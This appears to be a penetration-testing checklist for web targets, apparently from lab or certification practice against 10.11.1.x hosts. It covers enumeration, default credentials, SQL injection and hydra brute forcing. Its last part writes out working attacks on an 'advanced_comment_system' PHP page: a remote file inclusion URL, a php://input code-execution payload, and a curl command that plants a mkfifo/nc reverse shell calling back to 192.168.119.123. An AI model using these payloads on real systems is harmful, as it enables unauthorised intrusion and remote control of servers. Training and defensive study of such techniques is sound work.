# Web Path
## Basic Enumeration
- Find the index page
- Check wappalyzer in order to see what the page was built with
- What is the version of the web server running
### Paths
- Enumerate the url paths to see if anything is hidden, and to map the site
- Check `robots.txt` 
- See if `php` files are taking parameters like `10.11.1.16/administrator/alerts/alertConfigField.php?urlConfig=`
### Is there a login form?
- If its `phpmyadmin` or another application
- Try default creds
- Try basic `SQL-i`
#### Is it user generated content?
- Is there a username?
- If there is use hydra and try to brute the login
- Try basic `SQL-i`
### Vulnerabilities 
- Run `nikto`
- Exploit-db and look for vulnerabilities for the CMS or application running as well as the core version of the web server running
- Can you get RFI?
````
http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=http://192.168.119.123/php_reverse_shell.php%00
````
- ![image](https://user-images.githubusercontent.com/75596877/133100040-9f4a1a6a-1b86-4955-9c4d-651d59e51b31.png)
- Can you now get RCE via RFI?
````
curl -s --data "<?system('ls -la');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
````
- Now can you get a true call back?
````
curl -s --data "<?system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.119.123 443 >/tmp/f');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"![image](https://user-images.githubusercontent.com/75596877/133100324-7fedf270-77f0-481c-b6cc-e5ddce371e30.png)

````



































